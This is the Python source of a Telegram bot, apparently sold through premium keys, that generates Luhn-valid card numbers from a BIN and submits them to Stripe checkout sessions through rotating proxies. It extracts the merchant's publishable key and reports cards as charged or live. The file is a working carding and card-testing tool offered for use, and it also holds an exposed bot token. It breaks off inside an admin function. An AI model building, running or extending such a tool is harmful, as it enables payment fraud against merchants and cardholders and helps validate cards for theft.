"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT ⚡
Stripe Payment Checker | Proxy System | Key System
Dev: Asif Sakhani (@Asifsakhani786)
Version: 2.0 Premium

Required: pip install "python-telegram-bot[job-queue]" aiohttp
"""

import asyncio, json, os, random, re, time, base64
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO, BytesIO
from typing import Optional, Tuple

import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8737062520:AAFT0TbyBqg_sipBAoLPdg0sqE8NqKtJP6o"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"
LOG_CHANNEL = "@asifhitter"

# ═══════════════════════════════════════════════════════
# PREMIUM ANIMATED EMOJI IDs (UPDATED)
# ═══════════════════════════════════════════════════════

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "📥": "5350747347724810871", "💵": "5350711759625795085",
    "🏷️": "5436285465420383204", "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165", "🗑": "5305652587708572354", "🟢": "5444987348334965906",
    "🔵": "5258024802010026053", "🟡": "5343927661213279013", "🔴": "5447647474984449520",
    "❤️": "5287446418909328171", "🤖": "5219943216781995020", "🎯": "5444987348334965906",
}

# ═══════════════════════════════════════════════════════
# EMOJI HELPER
# ═══════════════════════════════════════════════════════

def e(emoji: str) -> str:
    """Convert emoji to premium animated HTML tag"""
    eid = PREMIUM_EMOJI_IDS.get(emoji)
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
    return emoji

def ec(emoji: str, count: int = 1) -> str:
    """Repeat emoji count times"""
    return "".join([e(emoji) for _ in range(count)])

# ═══════════════════════════════════════════════════════
# FILE PATHS
# ═══════════════════════════════════════════════════════

DATA_DIR = "data"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"
RESULTS_DIR = f"{DATA_DIR}/results"
MAX_PROXIES = 6

# ═══════════════════════════════════════════════════════
# JSON HELPERS
# ═══════════════════════════════════════════════════════

def jload(path, default=None):
    if default is None: default = {}
    try:
        if os.path.exists(path):
            with open(path) as f:
                return json.load(f)
    except: pass
    return default

def jsave(path, data):
    os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)

# ═══════════════════════════════════════════════════════
# PREMIUM SYSTEM
# ═══════════════════════════════════════════════════════

def is_premium(uid: int) -> bool:
    d = jload(PREMIUM_FILE, {"users": {}})
    u = d["users"].get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except: pass
    return False

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════

def detect_proxy(pstr: str) -> Optional[str]:
    p = pstr.strip().lower()
    if p.startswith(("http://", "https://")): return "http"
    if p.startswith("socks4://"): return "socks4"
    if p.startswith("socks5://"): return "socks5"
    if ":" in p: return "http"
    return None

async def check_proxy(proxy: str, ptype: str = "http") -> Tuple[bool, str]:
    try:
        url = proxy if "://" in proxy else f"{ptype}://{proxy}"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
            async with s.get("https://api.stripe.com/v1", proxy=url, ssl=False) as r:
                return True, str(r.status)
    except Exception as ex:
        return False, str(ex)[:40]

def get_user_proxies(uid: int) -> list:
    return jload(PROXY_FILE, {"users": {}})["users"].get(str(uid), [])

def save_user_proxies(uid: int, proxies: list):
    d = jload(PROXY_FILE, {"users": {}})
    d["users"][str(uid)] = proxies[:MAX_PROXIES]
    jsave(PROXY_FILE, d)

# ═══════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════

def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) 
                for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def card_len(bin_: str) -> int:
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str: str) -> dict:
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) == 15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════
# STRIPE CHECKER (ASYNC)
# ═══════════════════════════════════════════════════════

class SC:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.pk = self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.chk = ""
        self.sub = 0
        self.cname = "John Smith"
        self.cemail = "john@example.com"
        self.cc = "US"; self.cl1 = "476 West White Mountain Blvd"
        self.ccity = "Pinetop"; self.cst = "AZ"; self.czip = "85929"
        self.muid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.sid = f"{random.getrandbits(32):08x}"
        self.guid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"

    def _decode(self):
        m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
        if m: self.cs = m.group(0)
        if '#' in self.url:
            try:
                hp = self.url.split('#')[1]
                dc = base64.b64decode(unquote(hp))
                xr = ''.join(chr(b^5) for b in dc)
                m2 = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                if m2: self.pk = m2.group(0)
            except: pass

    def _hdr(self) -> dict:
        return {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Authorization": f"Bearer {self.pk}",
        }

    async def init(self) -> bool:
        self._decode()
        if not self.pk or not self.cs:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                    async with s.get(self.url, proxy=self.proxy, ssl=False) as r:
                        h = await r.text()
                        if not self.cs:
                            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.cs = m.group(0)
                        if not self.pk:
                            m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.pk = m.group(0)
            except: pass
        if not self.cs or not self.pk: return False
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._hdr(),
                    data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=self.proxy, ssl=False
                ) as r:
                    d = await r.json()
        except: return False
        
        if "error" in d: return False
        
        ac = d.get("account_settings") or {}
        self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
        lg = d.get("line_item_group") or {}
        iv = d.get("invoice") or {}
        pi = d.get("payment_intent") or {}
        am = lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
        cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
        self.amt_raw = am
        self.amt = f"${am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "Trial/$0")
        self.chk = d.get("init_checksum","")
        self.sub = lg.get("subtotal",0) if lg else am
        
        cu2 = d.get("customer") or {}
        ad = cu2.get("address") if cu2 else {}
        ad = ad or {}
        self.cname = cu2.get("name") or "John Smith"
        self.cemail = d.get("customer_email") or f"john{random.randint(100,999)}@gmail.com"
        self.cc = ad.get("country") or "US"
        self.cl1 = ad.get("line1") or "476 West White Mountain Blvd"
        self.ccity = ad.get("city") or "Pinetop"
        self.cst = ad.get("state") or "AZ"
        self.czip = ad.get("postal_code") or "85929"
        return True

    async def charge(self, card: dict) -> dict:
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown"}
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as s:
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]={quote(self.cname)}&billing_details[email]={quote(self.cemail)}"
                    f"&billing_details[address][country]={self.cc}&billing_details[address][line1]={quote(self.cl1)}"
                    f"&billing_details[address][city]={quote(self.ccity)}&billing_details[address][postal_code]={self.czip}"
                    f"&billing_details[address][state]={self.cst}&key={self.pk}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                    f"&payment_user_agent={quote('stripe.js/f5e714652c')}"
                    f"&time_on_page={random.randint(25000,55000)}&pasted_fields={quote('number')}"
                )
                async with s.post("https://api.stripe.com/v1/payment_methods",
                                  headers=self._hdr(), data=pmb, proxy=self.proxy, ssl=False) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code","")
                    mg = pm["error"].get("message","")
                    if cd in ("incorrect_cvc","insufficient_funds") or any(x in mg.lower() for x in ("cvc","cvv","security code")):
                        res["st"], res["msg"] = "LIVE", "CVC MATCH" if "cvc" in mg.lower() else "INSUFFICIENT FUNDS"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:80]
                    return res
                
                pmid = pm.get("id")
                if not pmid: return res
                
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                )
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  headers=self._hdr(), data=cfb, proxy=self.proxy, ssl=False) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code","")
                    mg = er.get("message","")
                    if "captcha" in mg.lower(): res["st"], res["msg"] = "HCAPTCHA", "Captcha"
                    elif cd in ("challenge_required","require_action"): res["st"], res["msg"] = "3DS", "3DS Required"
                    elif cd in ("incorrect_cvc","insufficient_funds"): res["st"], res["msg"] = "LIVE", cd
                    else: res["st"], res["msg"] = "DECLINED", mg[:80]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status","") or cf.get("status","")
                    if st2 == "succeeded": res["st"], res["msg"] = "CHARGED", "PAYMENT SUCCESSFUL!"
                    elif st2 == "requires_action": res["st"], res["msg"] = "3DS", "3DS Required"
                    else: res["st"], res["msg"] = "ERROR", st2
        except Exception as ex:
            res["msg"] = str(ex)[:60]
        return res

# ═══════════════════════════════════════════════════════
# HTML ESCAPE HELPER
# ═══════════════════════════════════════════════════════

def h(text: str) -> str:
    """Escape text for HTML parse mode"""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ═══════════════════════════════════════════════════════
# BOT COMMANDS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    prem = is_premium(uid)
    adm = is_admin(uid)
    
    # Badge: Admin always shows ADMIN, premium shows PREMIUM, else FREE
    if adm:
        badge = f"{e('⚡')} {e('👑')} ADMIN"
    elif prem:
        badge = f"{e('👑')} PREMIUM"
    else:
        badge = f"{e('⛔')} FREE"
    
    kb = [
        [InlineKeyboardButton(f"{e('🌐')} Gateway Check", callback_data="gate_help")],
        [InlineKeyboardButton(f"{e('💳')} Hit Checkout", callback_data="hit_help")],
        [InlineKeyboardButton(f"{e('🔐')} Proxy Manager", callback_data="proxy_menu")],
        [InlineKeyboardButton(f"{e('🔑')} Redeem Key", callback_data="redeem_help")],
        [InlineKeyboardButton(f"{e('👤')} My Status", callback_data="status")],
    ]
    if adm:
        kb.append([InlineKeyboardButton(f"{e('⚡')} Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"{e('❤️')} Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
    
    txt = f"""
{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> v2.0 Premium

{e('⭐️')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway info
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Check proxy status
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /auth — Redeem premium key
{e('👤')} /status — Premium status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ PROXY COMMANDS ═══════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message
    
    content = ""
    if msg.document:
        f = await msg.document.get_file()
        fb = await f.download_as_bytearray()
        content = fb.decode("utf-8", errors="ignore")
    elif msg.text:
        content = msg.text.replace("/addproxy", "").strip()
    else:
        await msg.reply_text(f"{e('❌')} Send proxy list or .txt file", parse_mode=ParseMode.HTML)
        return
    
    lines = [l.strip() for l in content.split("\n") if l.strip()]
    if not lines:
        await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
        return
    
    current = get_user_proxies(uid)
    slots_left = MAX_PROXIES - len(current)
    if slots_left <= 0:
        await msg.reply_text(f"{e('⛔')} Proxy limit reached! ({MAX_PROXIES} max)\nUse /rmproxy first", parse_mode=ParseMode.HTML)
        return
    
    st = await msg.reply_text(f"{e('⏳')} Checking proxies...", parse_mode=ParseMode.HTML)
    added = 0
    
    for pline in lines[:slots_left*2]:
        if added >= slots_left: break
        pt = detect_proxy(pline)
        if not pt: continue
        live, _ = await check_proxy(pline, pt)
        if live:
            pkey = pline if "://" in pline else f"{pt}://{pline}"
            if pkey not in current:
                current.append(pkey)
                added += 1
    
    save_user_proxies(uid, current)
    
    await st.edit_text(
        f"{e('✅')} <b>Proxies Added!</b>\n\n"
        f"{e('📦')} Added: <b>{added}</b>\n"
        f"{e('📊')} Total: <b>{len(current)}/{MAX_PROXIES}</b>\n"
        f"{e('💠')} Slots left: <b>{MAX_PROXIES-len(current)}</b>",
        parse_mode=ParseMode.HTML
    )

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = get_user_proxies(uid)
    
    if not proxies:
        await update.message.reply_text(f"{e('❌')} No proxies saved. Use /addproxy", parse_mode=ParseMode.HTML)
        return
    
    st = await update.message.reply_text(f"{e('⏳')} Checking all proxies...", parse_mode=ParseMode.HTML)
    result = []
    live_c = 0
    
    for p in proxies:
        pt = detect_proxy(p) or "http"
        is_live, info = await check_proxy(p, pt)
        status = f"{e('✅')} LIVE" if is_live else f"{e('❌')} DEAD"
        if is_live: live_c += 1
        result.append(f"{status} | <code>{h(p[:40])}</code> | {h(info)}")
    
    txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n"
    txt += f"{e('💠')} Live: <b>{live_c}</b> | Dead: <b>{len(proxies)-live_c}</b> | Total: <b>{len(proxies)}</b>\n\n"
    txt += "\n".join(result[:15])
    if len(result) > 15:
        txt += f"\n\n{e('ℹ️')} ...and {len(result)-15} more"
    
    await st.edit_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    current = get_user_proxies(uid)
    
    if not current:
        await update.message.reply_text(f"{e('❌')} No proxies to remove", parse_mode=ParseMode.HTML)
        return
    
    if ctx.args:
        arg = ctx.args[0]
        if arg.lower() == "all":
            save_user_proxies(uid, [])
            await update.message.reply_text(f"{e('✅')} All proxies removed!", parse_mode=ParseMode.HTML)
            return
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(current):
                removed = current.pop(idx)
                save_user_proxies(uid, current)
                await update.message.reply_text(f"{e('✅')} Removed: <code>{h(removed[:50])}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"{e('❌')} Invalid number", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(f"{e('❌')} Invalid number", parse_mode=ParseMode.HTML)
    else:
        txt = f"{e('🗑')} <b>REMOVE PROXY</b>\n\nSelect number:\n\n"
        for i, p in enumerate(current, 1):
            txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
        txt += f"\n{e('ℹ️')} Usage: <code>/rmproxy 1</code> or <code>/rmproxy all</code>"
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# ═══════════════ GATEWAY ═══════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    url = ctx.args[0]
    uid = update.effective_user.id
    proxies = get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('⏳')} Fetching gateway...", parse_mode=ParseMode.HTML)
    
    ck = SC(url, proxy)
    ok = await ck.init()
    
    if ok:
        await st.edit_text(
            f"{e('🌐')} <b>GATEWAY INFO</b>\n\n"
            f"{e('📦')} Merchant: <b>{h(ck.mer)}</b>\n"
            f"{e('💰')} Amount: <b>{h(ck.amt)}</b>\n"
            f"{e('🔑')} PK: <code>{h(ck.pk[:25])}...</code>\n"
            f"{e('🔗')} CS: <code>{h(ck.cs[:25])}...</code>\n\n"
            f"{e('✅')} Gateway is LIVE",
            parse_mode=ParseMode.HTML
        )
    else:
        await st.edit_text(f"{e('❌')} Failed to fetch gateway", parse_mode=ParseMode.HTML)

# ═══════════════ HIT (PREMIUM) ═══════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if not is_premium(uid) and not adm:
        await update.message.reply_text(
            f"{e('🚫')} <b>ACCESS DENIED</b>\n\n"
            f"{e('⛔')} Premium feature!\n"
            f"{e('🔑')} Use /auth &lt;key&gt; to activate\n"
            f"{e('👤')} Contact: <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} Usage: <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n"
            f"{e('💳')} Example: <code>/hit https://... 37936303</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = ctx.args[0]
    bin_in = ctx.args[1]
    
    proxies = get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
    
    ck = SC(url, proxy)
    if not await ck.init():
        await st.edit_text(f"{e('❌')} Failed to init session", parse_mode=ParseMode.HTML)
        return
    
    cards = [gen_card(bin_in) for _ in range(10)]
    
    res = {"CHARGED": 0, "LIVE": 0, "3DS": 0, "DECLINED": 0, "HCAPTCHA": 0, "ERROR": 0}
    charged_c = []
    live_c = []
    
    for i, card in enumerate(cards):
        att_text = f"""
{e('🚀')} <b>ASIF HITTER</b> {e('💳')}

{e('📦')} Merchant: <b>{h(ck.mer)}</b>
{e('💰')} Amount: <b>{h(ck.amt)}</b>
{e('💳')} BIN: <code>{bin_in[:8]}xxxx</code>

{e('⏳')} Attempt: <b>{i+1}/10</b>
{e('🎯')} Card: <code>{card['cc'][:6]}xxxxxx{card['cc'][-4:]}</code>

{e('📊')} {e('🟢')}: <b>{res['CHARGED']}</b> {e('🔵')}: <b>{res['LIVE']}</b> 🟡: <b>{res['3DS']}</b> 🔴: <b>{res['DECLINED']}</b>
"""
        try:
            await st.edit_text(att_text, parse_mode=ParseMode.HTML)
        except: pass
        
        r = await ck.charge(card)
        sts = r["st"]
        if sts in res: res[sts] += 1
        else: res[sts] = 1
        
        if sts == "CHARGED": charged_c.append(r["card"])
        elif sts == "LIVE": live_c.append(r["card"])
    
    # Final dashboard
    dash = f"""
{e('👑')} <b>RESULTS</b> {e('👑')}

{e('📦')} <b>{h(ck.mer)}</b>
{e('💰')} <b>{h(ck.amt)}</b>

{e('✅')} Charged: <b>{res['CHARGED']}</b>
{e('💎')} Live: <b>{res['LIVE']}</b>
🟡 3DS: <b>{res['3DS']}</b>
🔴 Declined: <b>{res['DECLINED']}</b>
{e('⛔')} Captcha: <b>{res.get('HCAPTCHA',0)}</b>
⚪ Error: <b>{res.get('ERROR',0)}</b>

{e('📊')} Total: <b>10</b> cards
"""
    if charged_c:
        dash += f"\n{e('🔥')} <b>CHARGED:</b>\n"
        for c in charged_c:
            dash += f"{e('✅')} <code>{c}</code>\n"
    if live_c:
        dash += f"\n{e('💎')} <b>LIVE:</b>\n"
        for c in live_c:
            dash += f"{e('⭐️')} <code>{c}</code>\n"
    
    dash += f"\n{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>"
    
    await st.edit_text(dash, parse_mode=ParseMode.HTML)
    
    # Log to channel
    if LOG_CHANNEL and (charged_c or live_c):
        try:
            await ctx.bot.send_message(
                LOG_CHANNEL,
                f"{e('🔥')} <b>HIT LOG</b>\n"
                f"{e('👤')} User: <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('📦')} {h(ck.mer)}\n"
                f"{e('💰')} {h(ck.amt)}\n"
                f"{e('✅')} Charged: {len(charged_c)} | {e('💎')} Live: {len(live_c)}",
                parse_mode=ParseMode.HTML
            )
        except: pass

# ═══════════════ AUTH & KEYS ═══════════════

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/auth &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    key = ctx.args[0].upper()
    kd = jload(KEYS_FILE, {"keys": {}})
    
    if key not in kd["keys"]:
        await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
        return
    
    kdata = kd["keys"][key]
    if kdata.get("used"):
        await update.message.reply_text(f"{e('❌')} Key already used!", parse_mode=ParseMode.HTML)
        return
    
    days = kdata["days"]
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = expiry
    jsave(KEYS_FILE, kd)
    
    pd = jload(PREMIUM_FILE, {"users": {}})
    pd["users"][str(uid)] = {
        "name": update.effective_user.full_name,
        "username": update.effective_user.username or "",
        "activated": datetime.now().isoformat(),
        "expiry": expiry,
        "key": key,
        "plan": f"{days} day(s)"
    }
    jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(
        f"{ec('🎉',3)} <b>CONGRATULATIONS!</b> {ec('🎉',3)}\n\n"
        f"{e('👑')} You have <b>PREMIUM ACCESS</b> to Asif Hitter!\n\n"
        f"{e('⏱️')} Expires: <code>{expiry[:10]}</code>\n"
        f"{e('💎')} Plan: <code>{days} day(s)</code>\n\n"
        f"{e('🚀')} Use /hit to start!\n"
        f"{e('❤️')} Welcome to Premium!",
        parse_mode=ParseMode.HTML
    )
    
    if LOG_CHANNEL:
        try:
            await ctx.bot.send_message(
                LOG_CHANNEL,
                f"{e('🎉')} <b>KEY REDEEMED</b>\n"
                f"{e('👤')} User: <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('🔑')} Key: <code>{key}</code>\n"
                f"{e('⏱️')} Plan: {days} day(s)\n"
                f"{e('📅')} Expires: {expiry[:10]}",
                parse_mode=ParseMode.HTML
            )
        except: pass

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if adm:
        await update.message.reply_text(
            f"{e('⚡')} {e('👑')} <b>ADMIN</b>\n\n"
            f"{e('✅')} Full access — all features unlocked!\n"
            f"{e('💎')} No expiry — permanent access",
            parse_mode=ParseMode.HTML
        )
    elif is_premium(uid):
        pd = jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('👑')} <b>PREMIUM ACTIVE</b>\n\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>\n"
            f"{e('✅')} All features unlocked!",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            f"{e('⛔')} <b>FREE USER</b>\n\n{e('🔑')} Use /auth &lt;key&gt; to upgrade",
            parse_mode=ParseMode.HTML
        )

# ═══════════════ ADMIN ═══════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(f"{e('🚫')} Admin only!", parse_mode=ParseMode.HTML)
        return
    
    if len(ctx.args) < 3:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/genkey 10 7 PREMIUM</code>", parse_mode=ParseMode.HTML)
        return
    
    try:
        count, days = int(ctx.args[0]), int(ctx.args[1])
        prefix = ctx.args[2].upper()
    except:
        await update.message.reply_text(f"{e('❌')} Invalid format", parse_mode=ParseMode.HTML)
        return
    
    kd = jload(KEYS_FILE, {"keys": {}})
    new = []
    for _ in range(count):
        k = f"{prefix}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
        kd["keys"][k] = {"days": days, "used": False, "used_by": None, "created": datetime.now().isoformat()}
        new.append(k)
    jsave(KEYS_FILE, kd)
    
    txt = f"{e('🎁')} <b>KEYS GENERATED</b>\n\n{e('📦')} Count: <b>{count}</b>\n{e('⏱️')} Duration: <b>{days} day(s)</b>\n\n"
    txt += "\n".join([f"{e('🔑')} <code>{k}</code>" for k in new])
    
    if len(new) > 15:
        buf = StringIO("\n".join(new))
        buf.name = "keys.txt"
        await update.message.reply_document(InputFile(buf, filename="keys.txt"), caption=f"{count} keys ({days} days)")
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
